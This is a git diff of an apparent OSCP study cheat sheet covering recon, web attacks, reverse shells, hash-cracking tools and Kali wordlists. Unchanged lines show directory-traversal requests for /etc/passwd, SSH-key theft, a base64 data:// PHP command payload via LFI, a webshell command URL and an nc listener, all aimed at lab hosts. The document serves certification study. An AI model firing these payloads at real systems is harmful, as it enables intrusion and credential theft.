@@ -1,7 +1,7 @@
 - [Capture the flag](#capture-the-flag)
 - [Penetration testing methodology](#penetration-testing-methodology)
 - [Web application attack](#web-application-attack)
-- [Encode/Decode](#encode-decode)
+- [Encode/Decode & Encrypt/Decrypt](#encode-decode--encrypt-decrypt)
 - [Reverse shell](#reverse-shell)
 - [File transfer](#file-transfer)
 - [Remote to other machines](#remote-to-other-machines)
@@ -76,7 +76,7 @@
        - enumerate all MIB tree of SNMPv1  
          `snmpwalk -c public -v1 -t 5 <target>`
 1. Web application recon
-   - ❗Edit hosts and access the site by hostname (show the actual site instead of default page)      
+   - ❗**Edit hosts and access the site by hostname** (show the actual site instead of default page)      
      `sudo nano /etc/hosts`  
      192.168.126.13    intranet.local
    - Software and tech   
@@ -139,9 +139,15 @@
      - Monitor for suspicious activity and audit logs
      - Network segmentation and firewall rules
 
+# Encode/Decode & Encrypt/Decrypt    
+- Base64 for web: [CyberChef](https://gchq.github.io/CyberChef/)
+- Hash identify: [Hash analyzer](https://www.tunnelsup.com/hash-analyzer/)
+- Hash identify: [hashcat example](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- Hash tracker: [CrackStation](https://crackstation.net/)
+  
 # Web application attack  
 - **Cross-site scripting**
-  - ⚠️ Goal: steal cookies, CSRF admin request  
+  - ⚠️ **Goal: steal cookies, CSRF admin request**  
   - Inspect: search boxes, comment fields, username/password, contact form, URL param, HTTP headers (referer, user-agent) 
   - Check how values rfected without proper sanitization
     ```
@@ -189,7 +195,7 @@
     http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag
     ```
 - **Directory traversal**
-  - ⚠️ Goal: access credentials/store ssh private key by using relative paths
+  - ⚠️ **Goal: access credentials/store ssh private key by using relative paths**
     `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
     `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
   - Inspect: url?**page=**xxx
@@ -200,7 +206,7 @@
     ssh -i dt_key -p 2222 offsec@mountaindesserts.com
     ```
 - **Local file inclusion (LFI)**
-  - ⚠️ Goal: load system files and RCE via log file 
+  - ⚠️ **Goal: load system files and RCE via log file** 
     `http://target.com/index.php?page=../../../../etc/passwd`
   - Inspect: url?**page=**xxx
   - Include the log file via LFI
@@ -225,7 +231,7 @@
       `kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
 NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 - Remote file inclusion (RFI)
-  - ⚠️ Goal: load malicious PHP payload from kali  
+  - ⚠️ **Goal: load malicious PHP payload from kali**  
   - Inspect: url?**page=**xxx
   - dd
   - dd
@@ -236,9 +242,6 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 - Command injection
 - SQL injection attacks
   
-# Encode/Decode  
-- Base64 for web: [CyberChef](https://gchq.github.io/CyberChef/)  
-
 # Reverse shell
 - Kali listener
   `nc -lvnp 443`
@@ -416,9 +419,6 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 | *8443 | TCP      | HTTPS-alt   | Web services over TLS                                    | `nmap --script ssl-cert,ssl-enum-ciphers -p8443 <IP>` |
 | 8888  | TCP      | Web Apps    | Jupyter, Flask, dev interfaces                           | `curl http://<IP>:8888` <br> `gobuster dir -u http://<IP>:8888 -w /usr/share/wordlists/dirb/common.txt` |
 
-
-
-
 # Port tunneling and port redirection 
 <img src="https://github.com/xasyhack/oscp2025/blob/main/images/port%20forward%20and%20tunneling.png" alt="" width="400"/>  
 
@@ -541,20 +541,20 @@ kali: proxychains nmap -Pn -sT -p80 172.16.10.10
 
 # Kali built in wordlist and payloads
 - Password wordlists
-  - ❗**/usr/share/wordlists/rockyou.txt**
+  - ❗`/usr/share/wordlists/rockyou.txt`
   - /usr/share/wordlists/test_small_credentials.txt
   - /usr/share/wordlists/fasttrack.txt  
 - Gobuster directory wordlists
-  - ❗**/usr/share/wordlists/dirb/common.txt**
+  - ❗`/usr/share/wordlists/dirb/common.txt`
   - /usr/share/wordlists/dirb/big.txt
   - /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
   - /usr/share/wfuzz/wordlist/general/megabeast.txt
   - /usr/share/wordlists/dirb/others/names.txt    
 - hashcat
-  - ❗**/usr/share/hashcat/rules/best64.rule**
+  - ❗`/usr/share/hashcat/rules/best64.rule`
   - /usr/share/hashcat/rules/rockyou-30000.rule
 - webshells
-  - ❗**/usr/share/webshells/php/simple-backdoor.php**
+  - ❗`/usr/share/webshells/php/simple-backdoor.php`
   - /usr/share/webshells/aspx/cmdasp.aspx
 - post-exploitation/privilege escalation
   - /usr/share/peass/winpeas/winPEASx64.exe
